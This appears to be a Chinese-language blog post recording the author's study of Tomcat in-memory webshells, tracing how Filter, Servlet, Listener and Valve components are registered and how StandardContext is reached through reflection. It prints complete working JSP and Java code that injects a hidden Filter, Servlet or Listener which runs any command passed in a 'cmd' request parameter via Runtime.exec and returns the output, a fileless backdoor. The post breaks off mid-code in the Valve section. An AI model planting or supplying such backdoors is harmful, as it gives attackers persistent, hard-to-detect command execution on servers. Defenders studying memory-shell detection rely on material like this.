---
title: tomcat内存马学习
date: 2022-04-17 16:26:54
tags:
      - java
      - memshell
      - filter
categories: java
description: tomcat内存马原理学习记录
---

> 参考引用
>
> https://javasec.org/javaweb/MemoryShell

## Filter型内存马

##### 调试前的准备

首先配置环境和调试用的代码

新建java-web maven项目,在pom.xml中导入对应依赖

```xml
<dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.11</version>
      <scope>test</scope>
    </dependency>
    <!--Servlet 依赖-->
    <dependency>
      <groupId>javax.servlet</groupId>
      <artifactId>javax.servlet-api</artifactId>
      <version>3.1.0</version>
    </dependency>

    <!--JSP依赖-->
    <dependency>
      <groupId>javax.servlet.jsp</groupId>
      <artifactId>javax.servlet.jsp-api</artifactId>
      <version>2.3.3</version>
    </dependency>

    <!--JSTL表达式的依赖-->
    <dependency>
      <groupId>javax.servlet.jsp.jstl</groupId>
      <artifactId>jstl</artifactId>
      <version>1.2</version>
    </dependency>

    <!--standard标签库-->
    <dependency>
      <groupId>taglibs</groupId>
      <artifactId>standard</artifactId>
      <version>1.1.2</version>
    </dependency>
  </dependencies>
```

接着在filter处打断点,debug,但是出现了无法在此处step into的问题,和之前一样,去下载tomcat的源码给sourcepath中添加tomcat源码目录,调试的时候能正常进入,但是有很多报红,并不影响代码跟进调试,之后再解决这个问题



好吧,我是儍狗,原来maven可以直接导入tomcat依赖然后下载源码......

```xml
<dependency>
      <groupId>org.apache.tomcat</groupId>
      <artifactId>tomcat-catalina</artifactId>
      <version>9.0.58</version>
      <scope>provided</scope>
    </dependency>
```



> 接下来跟进到代码,跟进filter的代码流程

首先进入doFilter方法中,会直接进入`internalDoFilter()`方法中,这个才是Tomcat中真正实现过滤的类

![image-20220417184815764](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220417184815764.png)

当到最后一个Filter,就会调用对应servlet的service方法

![image-20220417185013757](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/image-20220417185013757.png)

总而言之,所有Filter就是一条独木桥上面的木板,少了哪一块都会导致后面的Filter的doFilter方法调用不到从而导致调用不到对应Servlet的service方法



在tomcat的组成中,一部分为服务器用于与外界交流,一部分是容器,里面运行的就是servlet,filter....

##### tomcat和servlet的关系

Tomcat将http请求文本接收并解析,然后封装成HttpServletResquest类型的request对象,

servlet将要响应的信息封装成HttpServletResponse对象给tomcat,tomcat就会将其编程响应文本的格式发送给浏览器



#### 容器组件Container

 容器代表一类组件，这类组件的作用就是接收客户端请求并返回响应数据，具体操作委派到子组件完成。

​    Engine、Host、Context、Wrapper均继承自Container

Tomcat中的Container用于封装和管理Servlet,以及具体处理Request请求,在Container中包含了四个子容器

##### Engine

​		最顶层容器组件,其下可以包含多个Host

实现类为`org.apache.catalina.core.StandardEngine`

##### Host

 		为了提供对多个域名的服务，我们可以将每个域名视为一个虚拟的主机。在每个Host下包含多个Context

实现类为`org.apache.catalina.core.StandardHost`

##### Context

​		一个Context代表一个Web应用,其下可以包含多个Wrapper

实现类为`org.apache.catalina.core.StandardContext`

##### Wrapper

​		一个Wrapper代表一个Servlet

实现类为`org.apache.catalina.core.StandardWrapper`

总而言之,Host是主机,Context是web应用,wrapper是servlet



##### 一些会用到的类

FilterDefs:

存放FilterDef的数组,,FilterDef中存放这过滤器名,过滤器实例,作用url等基本信息,(调试的时候没找到作用url的成员变量)

FilterConfigs:存放FilterConfig的数组,FilterConfig主要存放FilterDef和Filter对象等信息

FilterMaps:存放FilterMap数组,在FilterMap中主要存放了FilterName和对应的URLPattern	

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418151626862.png" alt="image-20220418151626862" style="zoom:50%;" />

FilterChain: 过滤器链,该对象上的doFilter方法能依次调用链上的Filter

StandardContext: Context接口的标准实现类,一个Context代表一个Web应用,其下可以包含多个Wrapper(servlet)

StandardWrapperValve: 一个Wrapper的标准实现类,一个Wrapper代表一个Servlet



在StandardWrapperValue中会利用ApplicationFilterFactory来创建filterChain

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418152549816.png" alt="image-20220418152549816" style="zoom:67%;" />

在`ApplicationFilterFactory`中的createFilterChain方法中,首先通过getParent获取当前wrapper的爹,也就是Context,然后获取到当前context中的所有filterMap,我自己写的是testFilter1和testFilter2两个

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418153140872.png" alt="image-20220418153140872" style="zoom:80%;" />

接下来

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418153636868.png" alt="image-20220418153636868" style="zoom:80%;" />

会对FilterMap进行遍历,如果当前请求中的url与遍历中的filterMap相对应,则把filterMap对应的FilterConfig添加到filterChain中去



添加完成后会调用doFilter方法

doFilter方法会调用internalDoFilter方法,该方法会依次从filters中取出filterConfig,调用filter的doFilter方法,从而调用到过滤器中重写的doFilter方法,触发自定义的代码

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418154301503.png" alt="image-20220418154301503" style="zoom:80%;" />



要想实现动态添加filter,首先要获取到context,因为根据前面的分析,filterMaps是通过context获取到的

![image-20220418155818702](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418155818702.png)

按照大佬的方法,首先web容器启动的时候会为每个web应用创建一个ServletContext对象,代表当前应用,而有一个类很特殊,就是`ApplicationContext`类,它是ServletContext的实现类,并且它的成员变量中包含了`context`的标准实现类`StandardContext`

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418160009434.png" alt="image-20220418160009434" style="zoom:67%;" />

可以通过反射来获取到它的这个成员变量,即为当前的context,然后就可以添加filterMaps,进行一系列操作了

获取到context后,就可以进行动态注入filter了,但是注入之前要明确注入的参数,注入内存马实际上是在模拟写xml文件的过程

filterDefs存放了filter的定义,对应的类和名称就相当于web.xml中这部分代码

```xml
<filter>
    <filter-name>testFilter1</filter-name>
    <filter-class>com.test.filter.testFilter1</filter-class>
  </filter>
```

filterMaps存放了filter的路径和对应filter的对应关系,还暗含了filter的调用顺序,相当于这部分代码

```xml
<filter-mapping>
    <filter-name>testFilter1</filter-name>
    <url-pattern>/*</url-pattern>
  </filter-mapping>
```

FilterConfigs

存放了FilterConfig数组,在FilterConfig中主要存放FilterDef和Filter对象的信息,调用的时候就是从这里面获取的filter

这里不得不提到一点,就是getClass方法得到的其实是能代表当前对象真正运行的类(Class)的对象

翻译的有点奇怪....,反正就是注意声明类型和实际类型的问题

![image-20220420112130648](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420112130648.png)

ServletContext接口当前正在运行的对象所对应的类就是ApplicationContextFacade

![image-20220418232736182](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418232736182.png)

而这个类中的Context的类型是ApplicationContext

![image-20220418233017639](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220418233017639.png)

`ApplicationContext`中有`StandardContext`类型的成员变量`context`,通过这样就能获取到对应的`context`

```
ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
//这里获取到的class是ApplicationContextFacade
    appctx.setAccessible(true);
        // ApplicationContext 为 ServletContext 的实现类
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
        // standardContext为context接口标准实现类
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
```

#### 添加filter到当前context



根据之前学习的相关参数包含顺序,由内到位依次创建

首先创建filterDef,包含filter的类和名称等信息

并添加到当前context中

```java
FilterDef filterDef=new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName("test");
    filterDef.setFilterClass(filter.getClass().getName());
standardContext.addFilterDef(filterDef);
```



接着创建filterMap,里面包含filter名称和路径的映射关系

并添加到context中,在添加之前还需要设置filterMap的状态,一般设置成REQUEST的状态

```java
FilterMap filterMap=new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName("test");
    filterMap.setDispatcher(DispatcherType.REQUEST.name());//添加的是当前diepatcher类型的名字
    standardContext.addFilterMapBefore(filterMap);
//addFilterMapBefore可以将当前的filter添加到filterChain第一个
```



在设置状态这里,

有一说一,学习计算机还得英语好,起初对于这段代码有点不解,点开之后看见了作者的注释,就都明白了,为什么非要设置这个东西呢,就是为了设置当前filterMap的状态,它可以用来代表filter被应用的时候的状态

Dispatcher本意是调度员的意思

```java
filterMap.setDispatcher(DispatcherType.REQUEST.name());//添加的是当前diepatcher类型的名字
```



<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220419132233195.png" alt="image-20220419132233195" style="zoom:67%;" />

最后是filterConfig这个东西了

filterConfig是一个接口,真正运行的它的类是ApplicationFilterConfig,所以需要新建一个ApplicationFilterConfig对象,添加到当前正在运行的context的filterConfigs中去(注意这里是复数)

分解成两个问题

1.自定义一个ApplicationFilterConfig对象

```java
Constructor<ApplicationFilterConfig> declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
    declaredConstructor.setAccessible(true);
    ApplicationFilterConfig filterConfig=(ApplicationFilterConfig) declaredConstructor.newInstance(standardContext,filterDef);
```

2.获取到filterConfigs并修改

filterConfigs中存的是filter名和filterConfig的Entry

```java
Field configs = standardContext.getClass().getDeclaredField("filterConfigs");
    configs.setAccessible(true);
    Map filterConfigs=(Map)configs.get(standardContext);
    filterConfigs.put("test",filterConfig);
```



##### 小总结

有了以上这些知识,就可以尝试自己写出filter型的内存马了

```jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>

<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>

<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>

<%
    //首先通过反射获取到context

    ServletContext servletContext = request.getSession().getServletContext();
    Class<? extends ServletContext> aClass = servletContext.getClass();
    Field appContext = aClass.getDeclaredField("context");
    appContext.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);
    Field stdContext = applicationContext.getClass().getDeclaredField("context");
    stdContext.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);


    Filter filter = new Filter() {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {

        }

        @Override
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            StringBuffer res = new StringBuffer();
            //加一个系统的判断
            String os = System.getProperty("os.name");
            boolean isWin = false;
            BufferedReader bufferedReader;
            if (os != null && os.toLowerCase().startsWith("windows")) {
                isWin = true;
            }

            try {
                if (isWin == false) {
                    bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
                } else {
                    bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("cmd /C " + cmd).getInputStream()));
                }

                String len;
                while ((len = bufferedReader.readLine()) != null) {
                    res.append(len + "\n");
                }

            } catch (Exception e) {
                res.append(e.getMessage());

            }
            response.getWriter().print("<pre>" + res.toString() + "</pre>");
        }

        @Override
        public void destroy() {

        }
    };

    //接下来创建一个FilterDef开始添加Filter
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName("test");
    filterDef.setFilterClass(filter.getClass().getName());
    standardContext.addFilterDef(filterDef);

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName("test");
    filterMap.setDispatcher(DispatcherType.REQUEST.name());//添加的是当前diepatcher类型的名字
    standardContext.addFilterMapBefore(filterMap);

    Constructor<ApplicationFilterConfig> declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
    declaredConstructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);

    Field configs = standardContext.getClass().getDeclaredField("filterConfigs");
    configs.setAccessible(true);
    Map filterConfigs = (Map) configs.get(standardContext);
    filterConfigs.put("test", filterConfig);

%>
</body>
</html>

```

参照了好几篇文章才勉强理解完,感谢这几篇文章的帮助

https://blog.csdn.net/qq_41874930/article/details/121184952

[Filter内存马浅析](https://blog.csdn.net/angry_program/article/details/116661899?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165034810816780269864296%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165034810816780269864296&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-116661899.142^v9^control,157^v4^control&utm_term=filter%E5%86%85%E5%AD%98%E9%A9%AC&spm=1018.2226.3001.4187)

[tomcat Filter内存马](https://blog.csdn.net/weixin_45682070/article/details/122930587?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165034810816780269864296%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165034810816780269864296&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-122930587.142^v9^control,157^v4^control&utm_term=filter%E5%86%85%E5%AD%98%E9%A9%AC&spm=1018.2226.3001.4187)



### 获取standrandContext的方法

#### 方法一

每加载一个Web应用就创建一个ServletContext对象来共享数据，Tomcat对ServletContext的实现为ApplicationContext，而ApplicationContext实例中包含StandardContext。那么StandardContext的获取思路大概为ServletContext->ApplicationContext->StandardContext。想要获取共享数据的对象ServletContext，先要获取携带数据的对象，例如request对象或ThreadLocal。二者有一点差异，request对象可以在不同线程内获取数据，而ThreadLocal只能在当前线程内获取数据。但是最终的ServletContext是唯一的，所以这两种获取方式理论上都可以采用。从应用范围上讲利用request对象更通用，但是如果无法直接获取request对象，可以从ThreadLocal入手

`ApplicationContext`中有`StandardContext`类型的成员变量`context`,通过这样就能获取到对应的`context`

```
ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
//这里获取到的class是ApplicationContextFacade
    appctx.setAccessible(true);
        // ApplicationContext 为 ServletContext 的实现类
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
        // standardContext为context接口标准实现类
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
```

#### 方法二

除了上面那种方法,还在看大佬博客的时候发现了一个方法,这个方法很巧妙

首先

在jsp中可以直接写的request对象的类型是HttpServletRequest,HttpServletRequest是一个接口,通过它,getClass(),获取到当前正在运行的它的对应对象的类是RequestFacade

![image-20220420101423176](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420101423176.png)

RequestFacade中有一个成员变量Request

![image-20220420102024626](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420102024626.png)



通过该Request中的getContext()方法可以获取到当前request对应的context

![image-20220420101210413](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420101210413.png)

```java
Field declaredField = request.getClass().getDeclaredField("request");
    declaredField.setAccessible(true);
    Request request1 = (Request)declaredField.get(request);
    StandardContext standardContext=(StandardContext) request1.getContext();
```

#### 方法三

通过ThreadLocal获取context

ThreadLocal是什么呢,顾名思义,就是它里面存的是当前线程才才可以访问和使用的一些变量,当然想用他里面的变量,也得先存进去不是

看大佬说的是因为在internalDoFilter方法调用中，将request赋值给了ThreadLocal。所以可以获取到request从而像方法二一样获取到context对象,但是这里就出现了一个令我有点不解的点,就是Filter的添加是在internalDoFilter之后,为什么可以在添加Filter之前就获取到ThreadLocal这个对象呢

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421121651249.png" alt="image-20220421121651249" style="zoom:67%;" />

![image-20220421121832745](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421121832745.png)



当ApplicationDispatcher.WRAP_SAME_OBJECT这个变量为true的时候,就会创建新的ThreadLocal并且将request对象放进去,这个值默认为false,所以通过反射修改一下

这个方法学习的推进遇见了麻烦,完事补上.......



#### 方法四

通过`ContextClassLoader`获取`standardContext`

ContextClassLoader实际上是一个虚的概念,它的本质还是ClassLoader,只是它破坏了双亲委托机制,让子类加载器可以加载父类加载器才能加载的内容

tomcat的类加载机制和双亲委派机制是相反它,它是先用webappClassLoader去尝试加载某个类,找不到再交给父类加载器去加载

webappClassLoader显然就是这样一个ContextClassLoader

![image-20220421144335949](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421144335949.png)

采用`Thread.currentThread().getContextClassLoader()`获取到的CLassLoader是ParalleWebappClassLoader,它是`WebappClassLoaderBase`的子类,由于contextClassLoader的特性,它可以加载`WebappClassLoaderBase`的内容

```java
org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();
```

#### 方法五

通过Thread获取context

跟着这篇[文章](https://www.jianshu.com/p/e2774aa3e9ba)学习,大概找context的路径是酱紫的

threads[16]->target->endpoint->handler->proto->adapter->connector->service->engine->children(map)->map("localhost")->StandardEngine->children(map)->map('')->standardContext

![image-20220420180444920](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420180444920.png)

![image-20220420182450812](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420182450812.png)

总之知道在哪里可以获取到context后过程其实并不难,主要的是细心一层层往下慢慢剥开,还有个问题就是说有的成员变量是在父类中的,需要多次`getSuperclass()`

通过这种方式实现的Filter内存马

> 可能是由于反射的操作过于复杂了吧,idea在多个getSuperclass后并没有跟往常一样,在getDeclatedField的时候提示变量名,而且还没有提示filed找不到的异常需要处理,只是standardContext变量需要在一开始就定义好,不然后面就会判断该变量无法读取到

```jsp
<%
    StandardContext standardContext=null;
    ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
    Field field=threadGroup.getClass().getDeclaredField("threads");
    field.setAccessible(true);
    Thread[] threads=(Thread[])field.get(threadGroup);
    for(Thread thread:threads){
        if(thread!=null){
            //遍历线程数组,选出Acceptor的线程
            String name = thread.getName();
            System.out.println(name);
            if(thread.getName().contains("http")&&thread.getName().contains("Acceptor")){
                //获取到对应的线程
                Field targetField = thread.getClass().getDeclaredField("target");
                targetField.setAccessible(true);
                Runnable target1 = (Runnable) targetField.get(thread);

                Field endpointField = target1.getClass().getDeclaredField("endpoint");
                endpointField.setAccessible(true);
                Object endpoint1 = endpointField.get(target1);

                Field handlerField = endpoint1.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                handlerField.setAccessible(true);
                Object handler1 = handlerField.get(endpoint1);

                Field protoField = handler1.getClass().getDeclaredField("proto");
                protoField.setAccessible(true);
                Object proto = protoField.get(handler1);

                Field adapterField = proto.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField("adapter");
                adapterField.setAccessible(true);
                Object adapter = adapterField.get(proto);

                Field connectorField = adapter.getClass().getDeclaredField("connector");
                connectorField.setAccessible(true);
                Object connector = connectorField.get(adapter);

                Field serviceField = connector.getClass().getDeclaredField("service");
                serviceField.setAccessible(true);
                Object service = serviceField.get(connector);

                Field engineField = service.getClass().getDeclaredField("engine");
                engineField.setAccessible(true);
                Object engine = engineField.get(service);


                Field children1 = engine.getClass().getSuperclass().getDeclaredField("children");
                children1.setAccessible(true);
                //这里得到的hashMap的entry 存的是域名和host的对应关系
                HashMap engineMap = (HashMap) children1.get(engine);

                //获取host
                StandardHost standardHost=(StandardHost)engineMap.values().iterator().next();

                Field declaredField = standardHost.getClass().getSuperclass().getDeclaredField("children");
                declaredField.setAccessible(true);
                HashMap contextMap = (HashMap)declaredField.get(standardHost);

               standardContext = (StandardContext)contextMap.values().iterator().next();

            }
        }


    }

    Filter filter = new Filter() {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {

        }

        @Override
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            StringBuffer res = new StringBuffer();
            //加一个系统的判断
            String os = System.getProperty("os.name");
            boolean isWin = false;
            BufferedReader bufferedReader;
            if (os != null && os.toLowerCase().startsWith("windows")) {
                isWin = true;
            }

            try {
                if (isWin == false) {
                    bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
                } else {
                    bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("cmd /C " + cmd).getInputStream()));
                }

                String len;
                while ((len = bufferedReader.readLine()) != null) {
                    res.append(len + "\n");
                }

            } catch (Exception e) {
                res.append(e.getMessage());

            }
            response.getWriter().print("<pre>" + res.toString() + "</pre>");
        }

        @Override
        public void destroy() {

        }
    };

    //接下来创建一个FilterDef开始添加Filter
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName("test");
    filterDef.setFilterClass(filter.getClass().getName());
    standardContext.addFilterDef(filterDef);

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName("test");
    filterMap.setDispatcher(DispatcherType.REQUEST.name());//添加的是当前diepatcher类型的名字
    standardContext.addFilterMapBefore(filterMap);

    Constructor<ApplicationFilterConfig> declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
    declaredConstructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);

    Field configs = standardContext.getClass().getDeclaredField("filterConfigs");
    configs.setAccessible(true);
    Map filterConfigs = (Map) configs.get(standardContext);
    filterConfigs.put("test", filterConfig);


%>
```

##### 原理学习

为什么可以通过Acceptor这个线程层层推进找到context呢,这就需要再学习一下了

由于对tomcat底层架构和java知识不足,只能先写点自己浅显的理解,之后了解足够之后再来补充

> 个人理解

在tomcat运行期间,肯定有很多线程被启动,他们都有各自要做的事情,Acceptor这个线程顾名思义,就是用来接收请求的线程,接收了请求,肯定是需要层层转发给engine->context->wrapper处理才行呢,那么这个线程中就肯定可以获取到context对象



## servlet类型的内存马

首先,跟进一些servlet的添加注册流程

首先在ContextConfig#webConfig()中读取xml文件信息

使用context#createWrapper新建一个wrapper对象,设置启动优先级,servlet的name,设置了servlet的Class

![image-20220420121557998](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420121557998.png)

并且通过addChild将其添加到context当中,

![image-20220420121642666](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420121642666.png)

然后循环遍历servletmapping添加路径和name的对应关系

![image-20220420122055271](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420122055271.png)



其实大体流程和之前的filter差不多

还变得简单了,原因呢就是wrapper和servlet是一一对应的关系

总共分为以下几步

1.获取到context并创建一个Wrapper对象

2.设置设置启动优先级,servlet的name,设置servlet对应的Class

3.将wrapper添加到context的children中

4.将路径和servlet做好映射

```java
Servlet servlet = new Servlet(){
        @Override
        public void init(ServletConfig config) throws ServletException {

        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            String cmd = request.getParameter("cmd");
            StringBuffer result = new StringBuffer();
            //加一个系统的判断
            String os = System.getProperty("os.name");
            boolean isWin = false;
            BufferedReader bufferedReader;
            if (os != null && os.toLowerCase().startsWith("windows")) {
                isWin = true;
            }

            try {
                if (isWin == false) {
                    bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
                } else {
                    bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("cmd /C " + cmd).getInputStream()));
                }

                String len;
                while ((len = bufferedReader.readLine()) != null) {
                    result.append(len + "\n");
                }

            } catch (Exception e) {
                result.append(e.getMessage());

            }
            response.getWriter().print("<pre>" + result.toString() + "</pre>");


        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {

        }
    };
    Class<? extends HttpServletRequest> aClass = request.getClass();
    Field declaredField = aClass.getDeclaredField("request");
    declaredField.setAccessible(true);
    Request req=(Request) declaredField.get(request);
    StandardContext standardContext=(StandardContext) req.getContext();

    String name=servlet.getClass().getSimpleName();
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName(name);
    wrapper.setLoadOnStartup(1);
    wrapper.setServlet(servlet);
    wrapper.setServletClass(servlet.getClass().getName());

    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/servlet",name);
```

访问对应的jsp让其完成动态注入,接着就可以在对应路径执行命令了



## Listener型内存马

在Tomcat中,自定义了很多继承于EventListener接口的对象,应用于各个对象的监听

在继承了这个接口的对象中,有一个ServletRequestListener,它用于监听ServletRequest的生成和销毁,也就是说,只要访问该网站资源,就会触发requestInitialized方法

<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420140012800.png" alt="image-20220420140012800" style="zoom: 50%;" />

在`StandardContext#fireRequestInitEvent`方法中,进行了对listener中初始化方法的调用

![image-20220420140848773](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420140848773.png)

综上所述,只需要创建一个`ServletRequestListener`并且将其添加到`StandardContext`中的`ApplicationEventListeners`就行了

```java

    ServletRequestListener servletRequestListener = new ServletRequestListener(){

        @Override
        public void requestDestroyed(ServletRequestEvent sre) {

        }

        @Override
        public void requestInitialized(ServletRequestEvent sre) {

            String cmd = request.getParameter("cmd");
            StringBuffer result = new StringBuffer();
            //加一个系统的判断
            String os = System.getProperty("os.name");
            boolean isWin = false;
            BufferedReader bufferedReader;
            if (os != null && os.toLowerCase().startsWith("windows")) {
                isWin = true;
            }

            try {
                if (isWin == false) {
                    bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
                } else {
                    bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("cmd /C " + cmd).getInputStream()));
                }

                String len;
                while ((len = bufferedReader.readLine()) != null) {
                    result.append(len + "\n");
                }

            } catch (Exception e) {
                result.append(e.getMessage());

            }
            try {
                response.getWriter().print("<pre>" + result.toString() + "</pre>");
            } catch (IOException e) {
                e.printStackTrace();
            }


        }
    };


    Field declaredField = request.getClass().getDeclaredField("request");
    declaredField.setAccessible(true);
    Request request1 = (Request)declaredField.get(request);
    StandardContext standardContext=(StandardContext) request1.getContext();

    standardContext.addApplicationEventListener(servletRequestListener);
```



## Valve(阀门)内存马

[tomcat管道与阀门原理讲解](https://www.cnblogs.com/coldridgeValley/p/5816414.html)

Tomcat在处理一个请求调用逻辑的时候,传递Request和Response对象使用了职责链模式

Tomcat定义了两个接口Pipeline(管道)和Valve(阀门)

Pipeline接口的实现类是`StandardPipeline`

![image-20220423172150621](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423172150621.png)

Valve一般直接使用其实现类ValveBase

![image-20220423172202365](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423172202365.png)

Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 `addValve` 方法，可以添加新 Valve 在 基础Valve之前，并按照添加顺序执行。

首先要了解的是每一种`container`都有一个自己的`StandardValve`(也就是基础Value)

- StandardEngineValve

- StandardHostValve

- StandardContextValve

- StandardWrapperValve

这些`Valve`会将接收到的数据扔给下一个`Container`的`Pipeline`

![image-20220423172536815](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423172536815.png)

Pipeline就像一个工厂中的生产线，负责调配工人（valve）的位置，valve则是生产线上负责不同操作的工人。
一个生产线的完成需要两步：
1，把原料运到工人边上
2，工人完成自己负责的部分

而tomcat的Pipeline实现是这样的：
1，在生产线上的第一个工人拿到生产原料后，二话不说就扔给下一个工人，下一个工人模仿第一个工人那样扔给下一个工人，直到最后一个工人，而最后一个工人被安排为上面提过的StandardValve，他要完成的工作居然是把生产资料运给自己包含的container的Pipeline上去。
2，四个container就相当于有四个生产线（Pipeline），四个Pipeline都这么干，直到最后的StandardWrapperValve拿到资源开始调用servlet。完成后返回来，一步一步的valve按照刚才丢生产原料是的顺序的倒序一次执行。如此才完成了tomcat的Pipeline的机制。

代码调用的地方

Adapter连接了Tomcat连接器`Connector`和容器`Container`它的实现类是`CoyoteAdapter`主要负责的是对请求进行封装,构造Request和Response对象.并将请求转发给Container也就是Servlet容器.

在`CoyoteAdapter`的`service`方法中调用了valve的invoke方法

![image-20220423173023450](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423173023450.png)

这里调用的是StandardEngineValve的invoke方法

![image-20220423173256592](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423173256592.png)

它在最后调用了Host容器的第一个Valve的invoke方法,如此像一条链一样走到之前写恶意valve的地方

##### 代码实现

在获取pipeline的时候有个小坑,我看见StandardContext在调试的时候有pipeline属性就以为它里面有这个属性,但是其实是在他继承的ContainerBase类里面呢

![image-20220423171315008](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423171315008.png)

![image-20220423171440443](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423171440443.png)

同时代码稍作修改,也可以往host或者wrapper中添加恶意Valve

```java
<%
